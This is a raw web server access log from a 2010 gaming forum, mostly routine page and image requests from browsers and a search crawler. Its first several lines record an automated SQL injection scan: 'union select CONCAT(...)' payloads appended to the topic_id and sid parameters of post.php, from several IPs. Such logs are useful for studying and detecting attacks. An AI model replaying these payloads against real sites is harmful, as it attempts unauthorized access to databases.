88.230.103.27 - - [05/Jul/2010:01:44:22 -0700] "GET wap.blackstardojo.org/post.php?topic_index=0&sid=49f0033704bc1bc6e12ed0e0798159c6&type=html&topic_id=2278%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 1599 "-" "czxt2s"
189.87.134.161 - - [05/Jul/2010:01:44:22 -0700] "GET wap.blackstardojo.org/post.php?topic_index=0&sid=1ba4ef6ccf8b4634665d5a84d1b26bb1&type=html&topic_id=2229%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 1823 "-" "czxt2s"
88.7.172.75 - - [05/Jul/2010:01:44:22 -0700] "GET wap.blackstardojo.org/post.php?topic_index=0&sid=6054188153116c4d76e611cdcf5c137d&type=html&topic_id=2230%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 1823 "-" "czxt2s"
41.249.43.238 - - [05/Jul/2010:01:44:22 -0700] "GET wap.blackstardojo.org/post.php?type=html&topic_id=1007&topic_index=42&sid=27b62f0a0f567cda53bbf0e7a3a4c325%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 12919 "-" "czxt2s"
88.230.103.27 - - [05/Jul/2010:01:44:23 -0700] "GET wap.blackstardojo.org/post.php?topic_index=0&sid=49f0033704bc1bc6e12ed0e0798159c6&type=html&topic_id=2278%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 1655 "-" "czxt2s"
87.169.52.124 - - [05/Jul/2010:01:44:23 -0700] "GET www.blackstardojo.org/shop/images/Pokeball.gif HTTP/1.1" 200 314 "http://fuckyeahpokememe.tumblr.com/post/739473558/keep-an-eye-out-tomorrow" "Opera/9.80 (Windows NT 5.1; U; de) Presto/2.6.30 Version/10.60"
88.230.103.27 - - [05/Jul/2010:01:44:23 -0700] "GET wap.blackstardojo.org/post.php?topic_index=0&sid=49f0033704bc1bc6e12ed0e0798159c6&type=html&topic_id=2278%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 1711 "-" "czxt2s"
88.230.103.27 - - [05/Jul/2010:01:44:24 -0700] "GET wap.blackstardojo.org/post.php?topic_index=0&sid=49f0033704bc1bc6e12ed0e0798159c6&type=html&topic_id=2278%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 1767 "-" "czxt2s"
88.230.103.27 - - [05/Jul/2010:01:44:24 -0700] "GET wap.blackstardojo.org/post.php?topic_index=0&sid=49f0033704bc1bc6e12ed0e0798159c6&type=html&topic_id=2278%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 1823 "-" "czxt2s"
67.195.111.226 - - [05/Jul/2010:01:44:28 -0700] "GET www.blackstardojo.org/posting.php?mode=quote&p=53045 HTTP/1.0" 302 39 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)"
67.195.111.226 - - [05/Jul/2010:01:44:29 -0700] "GET www.blackstardojo.org/login.php?redirect=posting.php&mode=quote&p=53045&sid=86bff01610f249681d33299cfb7ad4d9 HTTP/1.0" 200 18916 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)"
94.246.126.203 - - [05/Jul/2010:01:44:54 -0700] "GET www.blackstardojo.org/viewtopic.php?t=2376&start=15 HTTP/1.1" 200 56149 "http://www.blackstardojo.org/viewforum.php?f=16&sid=c7b89ec4b44c49544c161e0c8e6953aa" "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18741/19.752; U; en) Presto/2.6.25"
94.246.126.203 - - [05/Jul/2010:01:44:55 -0700] "GET www.blackstardojo.org/images/ranks/newbelts/Mantis/GreenMantisMod.png HTTP/1.1" 200 5830 "http://www.blackstardojo.org/viewtopic.php?t=2376&start=15" "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18741/19.752; U; en) Presto/2.6.25"
94.246.126.203 - - [05/Jul/2010:01:44:55 -0700] "GET www.blackstardojo.org/images/smiles/icon_wink.gif HTTP/1.1" 200 170 "http://www.blackstardojo.org/viewtopic.php?t=2376&start=15" "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18741/19.752; U; en) Presto/2.6.25"
94.246.126.203 - - [05/Jul/2010:01:44:55 -0700] "GET www.blackstardojo.org/templates/guildwars_tree/images/lang_english/reply.gif HTTP/1.1" 200 1756 "http://www.blackstardojo.org/viewtopic.php?t=2376&start=15" "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18741/19.752; U; en) Presto/2.6.25"
94.246.126.203 - - [05/Jul/2010:01:44:55 -0700] "GET www.blackstardojo.org/templates/guildwars_tree/images/rank1.gif HTTP/1.1" 200 652 "http://www.blackstardojo.org/viewtopic.php?t=2376&start=15" "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18741/19.752; U; en) Presto/2.6.25"
94.246.126.203 - - [05/Jul/2010:01:44:55 -0700] "GET www.blackstardojo.org/templates/guildwars_tree/images/lang_english/icon_quote.gif HTTP/1.1" 200 1139 "http://www.blackstardojo.org/viewtopic.php?t=2376&start=15" "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18741/19.752; U; en) Presto/2.6.25"
94.246.126.203 - - [05/Jul/2010:01:44:55 -0700] "GET www.blackstardojo.org/templates/guildwars_tree/images/lang_english/icon_profile.gif HTTP/1.1" 200 736 "http://www.blackstardojo.org/viewtopic.php?t=2376&start=15" "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18741/19.752; U; en) Presto/2.6.25"
94.246.126.203 - - [05/Jul/2010:01:44:55 -0700] "GET www.blackstardojo.org/templates/guildwars_tree/images/lang_english/icon_pm.gif HTTP/1.1" 200 679 "http://www.blackstardojo.org/viewtopic.php?t=2376&start=15" "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18741/19.752; U; en) Presto/2.6.25"
94.246.126.203 - - [05/Jul/2010:01:44:55 -0700] "GET www.blackstardojo.org/images/ranks/newbelts/Red.png HTTP/1.1" 200 4082 "http://www.blackstardojo.org/viewtopic.php?t=2376&start=15" "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18741/19.752; U; en) Presto/2.6.25"
94.246.126.203 - - [05/Jul/2010:01:44:55 -0700] "GET www.blackstardojo.org/images/ranks/gameware.png HTTP/1.1" 200 2341 "http://www.blackstardojo.org/viewtopic.php?t=2376&start=15" "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18741/19.752; U; en) Presto/2.6.25"
94.246.126.203 - - [05/Jul/2010:01:44:55 -0700] "GET www.blackstardojo.org/images/avatars/4684324644c1ca9bfe420f.png HTTP/1.1" 200 7660 "http://www.blackstardojo.org/viewtopic.php?t=2376&start=15" "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18741/19.752; U; en) Presto/2.6.25"
94.246.126.203 - - [05/Jul/2010:01:44:55 -0700] "GET www.blackstardojo.org/images/avatars/86442633446eb7a6217d49.jpg HTTP/1.1" 404 1695 "http://www.blackstardojo.org/viewtopic.php?t=2376&start=15" "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18741/19.752; U; en) Presto/2.6.25"
94.246.126.203 - - [05/Jul/2010:01:44:55 -0700] "GET www.blackstardojo.org/images/ranks/ECRANK.PNG HTTP/1.1" 200 3312 "http://www.blackstardojo.org/viewtopic.php?t=2376&start=15" "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18741/19.752; U; en) Presto/2.6.25"
94.246.126.203 - - [05/Jul/2010:01:44:55 -0700] "GET www.blackstardojo.org/templates/guildwars_tree/images/lang_english/icon_msnm.gif HTTP/1.1" 200 701 "http://www.blackstardojo.org/viewtopic.php?t=2376&start=15" "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18741/19.752; U; en) Presto/2.6.25"
94.246.126.203 - - [05/Jul/2010:01:44:55 -0700] "GET www.blackstardojo.org/images/ranks/newbelts/Chameleon/BlackChameleonMod.png HTTP/1.1" 200 5200 "http://www.blackstardojo.org/viewtopic.php?t=2376&start=15" "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18741/19.752; U; en) Presto/2.6.25"
94.246.126.203 - - [05/Jul/2010:01:44:55 -0700] "GET www.blackstardojo.org/images/ranks/newbelts/Spider/GreenSpiderMod.png HTTP/1.1" 200 5837 "http://www.blackstardojo.org/viewtopic.php?t=2376&start=15" "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18741/19.752; U; en) Presto/2.6.25"
94.246.126.203 - - [05/Jul/2010:01:44:55 -0700] "GET www.blackstardojo.org/templates/guildwars_tree/images/spacer.gif HTTP/1.1" 200 43 "http://www.blackstardojo.org/viewtopic.php?t=2376&start=15" "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18741/19.752; U; en) Presto/2.6.25"
94.246.126.203 - - [05/Jul/2010:01:44:55 -0700] "GET www.blackstardojo.org/medals/WiseMedal.png HTTP/1.1" 200 4657 "http://www.blackstardojo.org/viewtopic.php?t=2376&start=15" "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18741/19.752; U; en) Presto/2.6.25"
94.246.126.203 - - [05/Jul/2010:01:44:55 -0700] "GET www.blackstardojo.org/templates/guildwars_tree/images/rank6.gif HTTP/1.1" 200 1086 "http://www.blackstardojo.org/viewtopic.php?t=2376&start=15" "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18741/19.752; U; en) Presto/2.6.25"
94.246.126.203 - - [05/Jul/2010:01:44:55 -0700] "GET www.blackstardojo.org/medals/doagmedal_212.png HTTP/1.1" 200 1418 "http://www.blackstardojo.org/viewtopic.php?t=2376&start=15" "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18741/19.752; U; en) Presto/2.6.25"
94.246.126.203 - - [05/Jul/2010:01:44:55 -0700] "GET www.blackstardojo.org/medals/ConcordatMedal.png HTTP/1.1" 200 3047 "http://www.blackstardojo.org/viewtopic.php?t=2376&start=15" "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18741/19.752; U; en) Presto/2.6.25"
94.246.126.203 - - [05/Jul/2010:01:44:55 -0700] "GET www.blackstardojo.org/medals/LabyrinthMedal.png HTTP/1.1" 200 3591 "http://www.blackstardojo.org/viewtopic.php?t=2376&start=15" "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18741/19.752; U; en) Presto/2.6.25"
94.246.126.203 - - [05/Jul/2010:01:44:55 -0700] "GET www.blackstardojo.org/medals/challengemedalvy7.png HTTP/1.1" 200 4453 "http://www.blackstardojo.org/viewtopic.php?t=2376&start=15" "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18741/19.752; U; en) Presto/2.6.25"
